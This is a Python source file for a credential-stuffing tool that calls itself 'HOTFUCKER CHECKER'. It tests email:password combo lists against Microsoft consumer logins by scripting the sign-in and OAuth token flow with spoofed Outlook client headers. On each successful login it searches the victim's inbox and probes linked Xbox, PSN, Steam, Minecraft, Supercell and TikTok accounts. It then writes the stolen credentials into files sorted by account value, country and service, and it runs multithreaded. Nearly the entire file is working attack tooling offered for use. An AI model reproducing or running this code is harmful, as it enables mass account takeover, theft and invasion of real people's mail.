                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "account.tiktok"},
                    "Size": 10,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }

            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)

            if r.status_code == 200:
                data = r.json()
                username = None

                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)

                        if total > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']

                                    patterns = [
                                        r'Salut\s+([^,]+)',
                                        r'Hallo\s+([^,]+)',
                                        r'Xin chào\s+([^,]+)',
                                        r'Hi\s+([^,]+)',
                                        r'Hello\s+([^,]+)'
                                    ]

                                    for pattern in patterns:
                                        match = re.search(pattern, preview)
                                        if match:
                                            username = match.group(1).strip()
                                            break

                                    if username:
                                        break

                        if username:
                            return {
                                "tiktok_status": "LINKED",
                                "username": username,
                                "category": "social_media",
                                "subcategory": "tiktok"
                            }

                return {"tiktok_status": "FREE", "username": None}

            return {"tiktok_status": "FREE", "username": None}

        except Exception as e:
            self.log(f"TikTok check error: {str(e)}")
            return {"tiktok_status": "ERROR", "username": None}

    def check_minecraft(self, email, access_token, cid):
        """Check Minecraft account ownership"""
        try:
            self.log("Checking Minecraft...")

            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'Outlook-Android/2.0'
            }

            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=10)

            if r.status_code == 200:
                data = r.json()
                return {
                    "minecraft_status": "OWNED",
                    "minecraft_username": data.get('name', 'Unknown'),
                    "minecraft_uuid": data.get('id', ''),
                    "minecraft_capes": [cape.get('alias', '') for cape in data.get('capes', [])],
                    "category": "gaming",
                    "subcategory": "minecraft_pe"
                }
            else:
                return {"minecraft_status": "FREE", "minecraft_username": None}

        except Exception as e:
            self.log(f"Minecraft check error: {str(e)}")
            return {"minecraft_status": "ERROR", "minecraft_username": None}

    def check(self, email, password):
        try:
            self.log(f"Checking: {email} (Mode: {self.check_mode})")

            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            r1 = self.session.get(url1, headers=headers1, timeout=15)

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            time.sleep(0.3)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }

            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }

            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            response_text = r3.text.lower()

            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD"}

            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return {"status": "2FA", "email": email, "password": password}

            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return {"status": "2FA", "email": email, "password": password}

            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD"}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}

            cid = mspcid.upper()

            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"

            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)

            if "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }

            country = ""
            name = ""

            try:
                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                      headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
                    name = self.parse_name_from_json(profile)
            except:
                pass

            ms_result = {}
            psn_result = {}
            steam_result = {}
            supercell_result = {}
            tiktok_result = {}
            minecraft_result = {}

            if self.check_mode in ["microsoft", "both", "microsoft_full", "full_enhanced"]:
                ms_result = self.check_microsoft_subscriptions(email, password, access_token, cid)

            if self.check_mode in ["psn", "both", "gaming_all", "full_enhanced"]:
                psn_result = self.check_psn(email, access_token, cid)

            if self.check_mode in ["steam", "both", "gaming_all", "full_enhanced"]:
                steam_result = self.check_steam(email, access_token, cid)

            if self.check_mode in ["supercell", "both", "mobile_gaming", "full_enhanced"]:
                supercell_result = self.check_supercell(email, access_token, cid)

            if self.check_mode in ["tiktok", "both", "social_media", "full_enhanced"]:
                tiktok_result = self.check_tiktok(email, access_token, cid)

            if self.check_mode in ["minecraft", "both", "gaming_all", "mobile_gaming", "full_enhanced"]:
                minecraft_result = self.check_minecraft(email, access_token, cid)

            inbox_count = "0"
            keyword_results = {}

            if self.check_mode in ["hotmail", "both", "full_enhanced"]:
                if self.api_mode == 1:
                    try:
                        startup_headers = {
                            "Host": "outlook.live.com",
                            "content-length": "0",
                            "x-owa-sessionid": str(uuid.uuid4()),
                            "x-req-source": "Mini",
                            "authorization": f"Bearer {access_token}",
                            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                            "action": "StartupData",
                            "content-type": "application/json"
                        }

                        r6 = self.session.post(
                            f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                            data="",
                            headers=startup_headers,
                            timeout=20
                        )

                        if r6.status_code == 200:
                            inbox_count = self.extract_inbox_count(r6.text)
                    except:
                        pass

                if self.keywords:
                    for keyword in self.keywords:
                        try:
                            url = "https://outlook.live.com/search/api/v2/query"
                            query_string = keyword
                            if "@" in keyword and " " not in keyword:
                                query_string = f'from:"{keyword}" OR "{keyword}"'

                            payload = {
                                "Cvid": str(uuid.uuid4()),
                                "Scenario": {"Name": "owa.react"},
                                "EntityRequests": [{
                                    "EntityType": "Conversation",
                                    "ContentSources": ["Exchange"],
                                    "Query": {"QueryString": query_string},
                                    "Size": 10
                                }]
                            }

                            headers = {
                                'Authorization': f'Bearer {access_token}',
                                'X-AnchorMailbox': f'CID:{cid}',
                                'Content-Type': 'application/json'
                            }

                            r_search = self.session.post(url, json=payload, headers=headers, timeout=10)

                            if r_search.status_code == 200:
                                data = r_search.json()
                                total = 0

                                if 'EntitySets' in data:
                                    for entity_set in data['EntitySets']:
                                        if 'ResultSets' in entity_set:
                                            for result_set in entity_set['ResultSets']:
                                                total = result_set.get('Total', 0)
                                                break

                                if total > 0:
                                    keyword_results[keyword] = {'count': total}
                        except:
                            continue

            result = {
                "status": "HIT",
                "keywords": keyword_results,
                "country": country,
                "name": name,
                "inbox_count": inbox_count,
                "email": email,
                "password": password
            }

            if ms_result:
                result["ms_status"] = ms_result.get("status", "FREE")
                result["subscriptions"] = ms_result.get("subscriptions", [])
                result["ms_data"] = ms_result.get("data", {})

            if psn_result:
                result["psn_status"] = psn_result.get("psn_status", "FREE")
                result["psn_orders"] = psn_result.get("psn_orders", 0)
                result["psn_purchases"] = psn_result.get("purchases", [])
                result["psn_category"] = psn_result.get("category")
                result["psn_subcategory"] = psn_result.get("subcategory")

            if steam_result:
                result["steam_status"] = steam_result.get("steam_status", "FREE")
                result["steam_count"] = steam_result.get("steam_count", 0)
                result["steam_purchases"] = steam_result.get("purchases", [])
                result["steam_category"] = steam_result.get("category")
                result["steam_subcategory"] = steam_result.get("subcategory")

            if supercell_result:
                result["supercell_status"] = supercell_result.get("supercell_status", "FREE")
                result["supercell_games"] = supercell_result.get("games", [])
                result["supercell_category"] = supercell_result.get("category")
                result["supercell_subcategory"] = supercell_result.get("subcategory")

            if tiktok_result:
                result["tiktok_status"] = tiktok_result.get("tiktok_status", "FREE")
                result["tiktok_username"] = tiktok_result.get("username")
                result["tiktok_category"] = tiktok_result.get("category")
                result["tiktok_subcategory"] = tiktok_result.get("subcategory")

            if minecraft_result:
                result["minecraft_status"] = minecraft_result.get("minecraft_status", "FREE")
                result["minecraft_username"] = minecraft_result.get("minecraft_username")
                result["minecraft_uuid"] = minecraft_result.get("minecraft_uuid", "")
                result["minecraft_capes"] = minecraft_result.get("minecraft_capes", [])
                result["minecraft_category"] = minecraft_result.get("category")
                result["minecraft_subcategory"] = minecraft_result.get("subcategory")

            return result

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "ERROR"}


class EnhancedResultManager:
    def __init__(self, combo_filename, mode_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = f"results/({timestamp})_{combo_filename}_{mode_name}"
        self.categories = EnhancedCategories()

        # Create main category folders
        for category_id, category_info in self.categories.get_all_categories().items():
            category_folder = os.path.join(self.base_folder, category_info["name"].lower().replace(" ", "_"))
            Path(category_folder).mkdir(parents=True, exist_ok=True)

        # Additional organization
        self.keywords_folder = os.path.join(self.base_folder, "keywords")
        self.countries_folder = os.path.join(self.base_folder, "countries")
        self.all_hits_file = os.path.join(self.base_folder, "all_hits.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
        self.summary_file = os.path.join(self.base_folder, "summary.csv")
        self.detailed_json = os.path.join(self.base_folder, "detailed_results.json")

        Path(self.keywords_folder).mkdir(parents=True, exist_ok=True)
        Path(self.countries_folder).mkdir(parents=True, exist_ok=True)

        # Initialize summary CSV
        self.init_summary_csv()

    def init_summary_csv(self):
        """Initialize CSV with headers"""
        headers = [
            "Email", "Password", "Status", "Name", "Country",
            "Inbox_Count", "Microsoft_Status", "Subscription_Count",
            "Total_Value", "PSN_Orders", "Steam_Purchases",
            "TikTok_Linked", "Minecraft_Owned", "Supercell_Games",
            "Keywords_Found", "Categories"
        ]

        with open(self.summary_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(headers)

    def save_hit(self, email, password, result_data):
        """Enhanced saving with detailed categorization"""

        # Save to all hits
        with open(self.all_hits_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

        # Save detailed JSON
        self.save_detailed_json(email, password, result_data)

        # Save to CSV summary
        self.save_to_csv(email, password, result_data)

        # Categorize all services
        self.categorize_all_services(email, password, result_data)

        # Save keywords
        self.save_keywords(email, password, result_data)

        # Save by country
        self.save_by_country(email, password, result_data)

    def categorize_all_services(self, email, password, result_data):
        """Categorize all detected services"""
        all_categories = self.categories.get_all_categories()

        # Microsoft services
        ms_data = result_data.get("ms_data", {})
        subscriptions = result_data.get("subscriptions", [])

        if subscriptions or ms_data:
            category_folder = os.path.join(self.base_folder, "microsoft")

            # Save balance
            if 'balance' in ms_data:
                balance_file = os.path.join(category_folder, "balance.txt")
                with open(balance_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Balance: {ms_data['balance']}\n")

            # Save rewards
            if 'rewards_points' in ms_data:
                rewards_file = os.path.join(category_folder, "rewards.txt")
                with open(rewards_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Points: {ms_data['rewards_points']}\n")

            # Save subscriptions
            for sub in subscriptions:
                sub_name = sub.get('name', '').lower()
                subcategory = sub.get('subcategory', 'other')

                # Get subcategory name
                subcategory_name = all_categories.get('microsoft', {}).get('subcategories', {}).get(subcategory, subcategory)
                sub_file = os.path.join(category_folder, f"{subcategory}.txt")

                line = f"{email}:{password} | {sub.get('name', 'UNKNOWN')}"
                if 'days_remaining' in sub:
                    line += f" | {sub['days_remaining']} days"
                if 'amount' in sub and 'currency' in sub:
                    line += f" | {sub['amount']} {sub['currency']}"
                if sub.get('is_expired'):
                    line += " | EXPIRED"
                line += "\n"

                with open(sub_file, 'a', encoding='utf-8') as f:
                    f.write(line)

        # PSN
        psn_orders = result_data.get("psn_orders", 0)
        if psn_orders > 0:
            category_folder = os.path.join(self.base_folder, "gaming")
            psn_file = os.path.join(category_folder, "psn_orders.txt")

            line = f"{email}:{password} | Orders: {psn_orders}\n"
            purchases = result_data.get("psn_purchases", [])

            if purchases:
                line += "=" * 40 + "\n"
                for i, purchase in enumerate(purchases[:5], 1):
                    item = purchase.get('item', 'Unknown')[:50]
                    line += f"  [{i}] {item}"

                    if 'price' in purchase:
                        line += f" - {purchase['price']}"
                    if 'date' in purchase:
                        line += f" ({purchase['date']})"

                    line += "\n"
                line += "=" * 40 + "\n"

            with open(psn_file, 'a', encoding='utf-8') as f:
                f.write(line)

        # Steam
        steam_count = result_data.get("steam_count", 0)
        if steam_count > 0:
            category_folder = os.path.join(self.base_folder, "gaming")
            steam_file = os.path.join(category_folder, "steam.txt")

            line = f"{email}:{password} | {steam_count} purchases"
            purchases = result_data.get("steam_purchases", [])
            if purchases:
                games = [p.get('game', 'Unknown')[:30] for p in purchases[:3]]
                line += f" | Games: {', '.join(games)}"
            line += "\n"

            with open(steam_file, 'a', encoding='utf-8') as f:
                f.write(line)

        # Supercell
        supercell_games = result_data.get("supercell_games", [])
        if supercell_games:
            category_folder = os.path.join(self.base_folder, "mobile_games")

            # Save all games
            all_games_file = os.path.join(category_folder, "supercell_all.txt")
            with open(all_games_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | Games: {', '.join(supercell_games)}\n")

            # Save individual games
            for game in supercell_games:
                game_id = game.lower().replace(" ", "_")
                game_file = os.path.join(category_folder, f"{game_id}.txt")
                with open(game_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")

        # TikTok
        tiktok_username = result_data.get("tiktok_username")
        if tiktok_username:
            category_folder = os.path.join(self.base_folder, "social_media")
            tiktok_file = os.path.join(category_folder, "tiktok.txt")
            with open(tiktok_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | @{tiktok_username}\n")

        # Minecraft
        minecraft_username = result_data.get("minecraft_username")
        if minecraft_username:
            category_folder = os.path.join(self.base_folder, "gaming")
            minecraft_file = os.path.join(category_folder, "minecraft_pe.txt")

            line = f"{email}:{password} | Username: {minecraft_username}"
            uuid = result_data.get("minecraft_uuid", "")
            if uuid:
                line += f" | UUID: {uuid[:8]}..."
            line += "\n"

            with open(minecraft_file, 'a', encoding='utf-8') as f:
                f.write(line)

    def save_keywords(self, email, password, result_data):
        """Save keyword hits"""
        keywords = result_data.get("keywords", {})
        for kw, info in keywords.items():
            # Clean keyword for filename
            clean_kw = ''.join(c for c in kw if c.isalnum() or c in (' ', '-', '_')).strip()
            clean_kw = clean_kw.replace(' ', '_')[:50]

            kw_file = os.path.join(self.keywords_folder, f"{clean_kw}.txt")
            with open(kw_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {info['count']}\n")

    def save_by_country(self, email, password, result_data):
        """Save by country code"""
        country = result_data.get("country", "").strip().upper()
        if country and len(country) >= 2:
            country_code = country[:2].lower()
            country_file = os.path.join(self.countries_folder, f"{country_code}.txt")
            try:
                with open(country_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
            except:
                pass

    def save_detailed_json(self, email, password, result_data):
        """Save detailed JSON data"""
        import json as json_module

        # Prepare data for JSON
        json_data = {
            "email": email,
            "password": password,
            "timestamp": datetime.now().isoformat(),
            "result": result_data
        }

        # Append to JSON file
        if os.path.exists(self.detailed_json):
            with open(self.detailed_json, 'r', encoding='utf-8') as f:
                try:
                    existing_data = json_module.load(f)
                    if isinstance(existing_data, list):
                        existing_data.append(json_data)
                    else:
                        existing_data = [existing_data, json_data]
                except:
                    existing_data = [json_data]
        else:
            existing_data = [json_data]

        with open(self.detailed_json, 'w', encoding='utf-8') as f:
            json_module.dump(existing_data, f, indent=2, ensure_ascii=False)

    def save_to_csv(self, email, password, result_data):
        """Save summary to CSV"""
        # Calculate total value
        total_value = 0
        categories_found = []
        subscriptions = result_data.get("subscriptions", [])

        for sub in subscriptions:
            if 'amount' in sub and sub['amount']:
                try:
                    total_value += float(sub['amount'])
                except:
                    pass

        # Collect categories
        if subscriptions:
            categories_found.append("microsoft")

        if result_data.get("psn_orders", 0) > 0:
            categories_found.append("gaming")

        if result_data.get("steam_count", 0) > 0:
            categories_found.append("gaming")

        if result_data.get("supercell_games"):
            categories_found.append("mobile_games")

        if result_data.get("tiktok_username"):
            categories_found.append("social_media")

        if result_data.get("minecraft_username"):
            categories_found.append("gaming")

        # Remove duplicates
        categories_found = list(set(categories_found))

        # Prepare row
        row = [
            email,
            password,
            result_data.get("status", ""),
            result_data.get("name", ""),
            result_data.get("country", ""),
            result_data.get("inbox_count", "0"),
            result_data.get("ms_status", ""),
            len(subscriptions),
            f"${total_value:.2f}",
            result_data.get("psn_orders", 0),
            result_data.get("steam_count", 0),
            "Yes" if result_data.get("tiktok_username") else "No",
            "Yes" if result_data.get("minecraft_username") else "No",
            len(result_data.get("supercell_games", [])),
            len(result_data.get("keywords", {})),
            ", ".join(categories_found)
        ]

        # Write to CSV
        with open(self.summary_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(row)

    def save_2fa(self, email, password):
        try:
            with open(self.two_fa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except:
            pass


class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.two_fa = 0
        self.bads = 0
        self.ms_premium = 0
        self.ms_free = 0
        self.psn_hits = 0
        self.steam_hits = 0
        self.supercell_hits = 0
        self.tiktok_hits = 0
        self.minecraft_hits = 0
        self.start_time = time.time()
        self.lock = Lock()
        self.last_length = 0

    def update(self, status, result_data=None):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if result_data:
                    subs = result_data.get("subscriptions", [])
                    ms_data = result_data.get("ms_data", {})
                    active_subs = [s for s in subs if not s.get('is_expired', False)]

                    if active_subs:
                        self.ms_premium += 1
                    elif ms_data or result_data.get("ms_status") == "FREE":
                        self.ms_free += 1

                    if result_data.get("psn_orders", 0) > 0:
                        self.psn_hits += 1

                    if result_data.get("steam_count", 0) > 0:
                        self.steam_hits += 1

                    if result_data.get("supercell_games"):
                        self.supercell_hits += 1

                    if result_data.get("tiktok_username"):
                        self.tiktok_hits += 1

                    if result_data.get("minecraft_username"):
                        self.minecraft_hits += 1
            elif status == "2FA":
                self.two_fa += 1
            else:
                self.bads += 1

    def print_live(self, check_mode):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            time_str = time.strftime("%M:%S", time.gmtime(elapsed))

            if self.last_length > 0:
                sys.stdout.write('\r' + ' ' * self.last_length + '\r')

            parts = []
            parts.append(f"{Colors.BRIGHT_BLUE}[{self.checked}/{self.total}]{Colors.END}")

            if self.hits > 0:
                parts.append(f"{Colors.BRIGHT_GREEN}✓{self.hits}{Colors.END}")

            if check_mode in ["microsoft", "both", "microsoft_full", "full_enhanced"]:
                if self.ms_premium > 0:
                    parts.append(f"{Colors.BRIGHT_MAGENTA}🎮{self.ms_premium}{Colors.END}")
                if self.ms_free > 0:
                    parts.append(f"{Colors.CYAN}⭕{self.ms_free}{Colors.END}")

            if check_mode in ["psn", "both", "gaming_all", "full_enhanced"] and self.psn_hits > 0:
                parts.append(f"{Colors.BRIGHT_BLUE}🎯{self.psn_hits}{Colors.END}")

            if check_mode in ["steam", "both", "gaming_all", "full_enhanced"] and self.steam_hits > 0:
                parts.append(f"{Colors.BRIGHT_CYAN}🎲{self.steam_hits}{Colors.END}")

            if check_mode in ["supercell", "both", "mobile_gaming", "full_enhanced"] and self.supercell_hits > 0:
                parts.append(f"{Colors.BRIGHT_YELLOW}⚔️{self.supercell_hits}{Colors.END}")

            if check_mode in ["tiktok", "both", "social_media", "full_enhanced"] and self.tiktok_hits > 0:
                parts.append(f"{Colors.MAGENTA}📱{self.tiktok_hits}{Colors.END}")

            if check_mode in ["minecraft", "both", "gaming_all", "mobile_gaming", "full_enhanced"] and self.minecraft_hits > 0:
                parts.append(f"{Colors.GREEN}⛏️{self.minecraft_hits}{Colors.END}")

            if self.two_fa > 0:
                parts.append(f"{Colors.YELLOW}🔐{self.two_fa}{Colors.END}")

            if self.bads > 0:
                parts.append(f"{Colors.RED}✗{self.bads}{Colors.END}")

            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.WHITE}{progress:.0f}%{Colors.END}")
            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.BRIGHT_YELLOW}{cpm:.0f}CPM{Colors.END}")
            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.BRIGHT_CYAN}{time_str}{Colors.END}")

            line = " ".join(parts)

            self.last_length = len(line) - line.count('\033')
            sys.stdout.write(line)
            sys.stdout.flush()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = f"""
{Colors.BRIGHT_CYAN}╔═══════════════════════════════════════════════════════════════╗
║ {Colors.BRIGHT_MAGENTA}██╗  ██╗ ██████╗ ████████╗███████╗██╗   ██╗ ██████╗██╗  ██╗ {Colors.BRIGHT_CYAN}║
║ {Colors.BRIGHT_MAGENTA}██║  ██║██╔═══██╗╚══██╔══╝██╔════╝██║   ██║██╔════╝██║ ██╔╝ {Colors.BRIGHT_CYAN}║
║ {Colors.BRIGHT_MAGENTA}███████║██║   ██║   ██║   █████╗  ██║   ██║██║     █████╔╝  {Colors.BRIGHT_CYAN}║
║ {Colors.BRIGHT_MAGENTA}██╔══██║██║   ██║   ██║   ██╔══╝  ██║   ██║██║     ██╔═██╗  {Colors.BRIGHT_CYAN}║
║ {Colors.BRIGHT_MAGENTA}██║  ██║╚██████╔╝   ██║   ██║     ╚██████╔╝╚██████╗██║  ██╗ {Colors.BRIGHT_CYAN}║
║ {Colors.BRIGHT_MAGENTA}╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝ {Colors.BRIGHT_CYAN}║
║                                                                                                        ║
║  {Colors.BRIGHT_YELLOW}HOTFUCKER CHECKER - ENHANCED CATEGORIES BY @AR4S001{Colors.BRIGHT_CYAN}         ║
║  {Colors.BRIGHT_YELLOW}HOTFUCKER MODDED - BY;NIKTO                        {Colors.BRIGHT_CYAN}         ║
║  {Colors.BRIGHT_GREEN}12 CATEGORIES • 100+ SUBCATEGORIES • ADVANCED ORGANIZATION{Colors.BRIGHT_CYAN}   ║
║  {Colors.BRIGHT_MAGENTA}MICROSOFT • GAMING • SOCIAL • STREAMING • SHOPPING • MORE{Colors.BRIGHT_CYAN}  ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)


def print_menu_header(title):
    print(f"\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_YELLOW} {title:^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}\n")


def print_option(number, title, desc, color=Colors.WHITE):
    print(f"{Colors.BRIGHT_CYAN}  [{Colors.BRIGHT_YELLOW}{number}{Colors.BRIGHT_CYAN}]{Colors.END} {color}{title}{Colors.END}")
    print(f"      {Colors.DIM}{desc}{Colors.END}")


if False: # cli entry

    clear()
    print_banner()

    print_menu_header("🎯 ENHANCED SERVICE SELECTION")
    print_option("1", "Hotmail Only", "Keywords + Inbox", Colors.BRIGHT_GREEN)
    print_option("2", "Microsoft Full", "Xbox + M365 + Office + Rewards", Colors.BRIGHT_MAGENTA)
    print_option("3", "Gaming Platforms", "PSN + Steam + Minecraft", Colors.BRIGHT_BLUE)
    print_option("4", "Mobile Gaming", "Supercell + Popular Mobile Games", Colors.BRIGHT_YELLOW)
    print_option("5", "Social Media", "TikTok + Social Platforms", Colors.MAGENTA)
    print_option("6", "All Gaming", "PSN + Steam + Supercell + Minecraft", Colors.BRIGHT_CYAN)
    print_option("7", "Everything", "All Services (Recommended)", Colors.BRIGHT_RED)
    print_option("8", "Custom Categories", "Choose specific services", Colors.BRIGHT_GREEN)

    check_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()

    check_mode_map = {
        "1": "hotmail",
        "2": "microsoft_full",
        "3": "gaming_all",
        "4": "mobile_gaming",
        "5": "social_media",
        "6": "all_gaming",
        "7": "full_enhanced",
        "8": "custom"
    }
    check_mode = check_mode_map.get(check_choice, "full_enhanced")

    # Handle custom mode
    if check_mode == "custom":
        print_menu_header("🔧 CUSTOM CATEGORIES")
        print("Select categories (comma-separated):")
        print(f"  {Colors.BRIGHT_MAGENTA}1. Microsoft{Colors.END}")
        print(f"  {Colors.BRIGHT_BLUE}2. Gaming{Colors.END}")
        print(f"  {Colors.BRIGHT_YELLOW}3. Mobile Games{Colors.END}")
        print(f"  {Colors.MAGENTA}4. Social Media{Colors.END}")
        print(f"  {Colors.BRIGHT_GREEN}5. Hotmail Keywords{Colors.END}")

        custom_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Your selection (e.g., 1,2,3): ").strip()
        check_mode = "custom"

    api_mode = 2
    if check_mode in ["hotmail", "both", "full_enhanced", "custom"]:
        print_menu_header("⚙️ API MODE")
        print_option("1", "Full API", "All features (Slow)", Colors.YELLOW)
        print_option("2", "Fast API", "Recommended (Balanced)", Colors.BRIGHT_GREEN)
        print_option("3", "Minimal API", "Quick validation (Fast)", Colors.CYAN)

        api_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()
        api_mode = int(api_choice) if api_choice in ["1", "2", "3"] else 2

    print_menu_header("🚀 THREADING")
    print_option("1", "Single Check", "Test one account", Colors.CYAN)
    print_option("2", "Serial Mode", "One by one (Safe)", Colors.YELLOW)
    print_option("3", "Multi-Threaded", "Parallel processing (Fast)", Colors.BRIGHT_GREEN)

    thread_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()

    if thread_choice not in ["1", "2", "3"]:
        print(f"{Colors.RED}✗ Invalid choice!{Colors.END}")
        exit()

    threads = 1
    if thread_choice == "3":
        threads_input = input(f"{Colors.BRIGHT_CYAN}└─{Colors.END} Threads (1-100): ").strip()
        try:
            threads = int(threads_input)
            threads = max(1, min(100, threads))
        except:
            threads = 10
            print(f"{Colors.YELLOW}⚠ Using default: 10 threads{Colors.END}")

    keywords = []
    if check_mode in ["hotmail", "both", "full_enhanced", "custom"]:
        print_menu_header("🔑 KEYWORDS")
